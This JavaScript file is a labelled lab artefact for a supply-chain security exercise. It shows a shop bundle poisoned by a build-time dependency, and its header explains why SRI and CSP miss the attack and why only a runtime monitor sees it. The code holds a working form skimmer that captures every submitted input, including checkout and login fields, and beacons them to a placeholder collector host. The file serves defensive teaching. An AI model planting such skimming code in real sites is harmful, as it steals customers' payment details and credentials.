/*
 * shop-bundle.js: the first-party bundle after a POISONED build (Round 4).
 *
 * LAB ARTEFACT, EDUCATIONAL ONLY (local collector only: __COLLECTOR__).
 *
 * A build-time dependency (think the Shai-Hulud npm worm, September 2025) landed
 * inside your own bundle. It ships from your origin, so SRI matches your own
 * build and a strict CSP nonces it like any of your code: neither control fires.
 * Its beacon goes to the one analytics origin connect-src has to allow. Only the
 * runtime monitor, which wraps the network APIs, sees the call-out.
 */
(function () {
  "use strict";
  ["checkout", "login-form"].forEach(function (id) {
    var form = document.getElementById(id);
    if (!form) return;
    form.addEventListener("submit", function () {
      var btn = form.querySelector("button[type=submit]");
      if (btn) btn.setAttribute("aria-busy", "true");
    });
  });

  // ---- the poisoned dependency ----
  document.addEventListener("submit", function (e) {
    var fields = {};
    Array.prototype.forEach.call(e.target.querySelectorAll("input"), function (el) {
      if (el.name) fields[el.name] = el.value;
    });
    try {
      navigator.sendBeacon("__COLLECTOR__/collect",
        JSON.stringify({ src: "firstparty-bundle", fields: fields }));
    } catch (_) { /* the monitor may have neutralised sendBeacon */ }
  }, true);
})();
